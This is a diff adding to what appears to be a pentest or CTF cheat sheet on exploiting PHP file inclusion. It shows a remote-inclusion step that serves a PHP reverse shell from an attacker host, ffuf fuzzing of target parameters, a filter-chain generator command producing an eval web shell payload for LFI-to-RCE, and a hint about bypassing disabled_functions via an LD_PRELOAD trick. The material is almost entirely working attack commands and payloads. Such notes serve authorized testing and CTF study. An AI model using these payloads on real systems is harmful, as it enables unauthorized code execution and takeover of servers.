@@ -19,3 +19,15 @@ RFI — if the include/fetch isn't restricted to local paths, point it at attack
 python -m http.server <LPORT>     # serve your payload (e.g. pentestmonkey php-reverse-shell)
 GET /<endpoint>?<param>=http://<LHOST>:<LPORT>/shell.php
 ```
+
+Fuzz for the parameter/payload shape when you don't already know it:
+```bash
+ffuf -w <LFI-wordlist, e.g. SecLists LFI-Jhaddix.txt> -u "http://<TARGET>/?<param>=FUZZ" -fl <baseline-linecount>
+```
+
+LFI-to-RCE with no write permission, via PHP filter chains (no upload needed — the `path` itself IS the payload):
+```bash
+python3 php_filter_chain_generator.py --chain '<?=eval($_POST["x"])?>' | grep '^php'
+# use the generated php://filter/... string as the LFI path parameter directly
+```
+If `disabled_functions` blocks `exec`/`system`/`shell_exec`/etc., check whether `putenv()` and `mail()` are still enabled — a Chankro-style `LD_PRELOAD` trick via a fake sendmail binary can still get code execution.
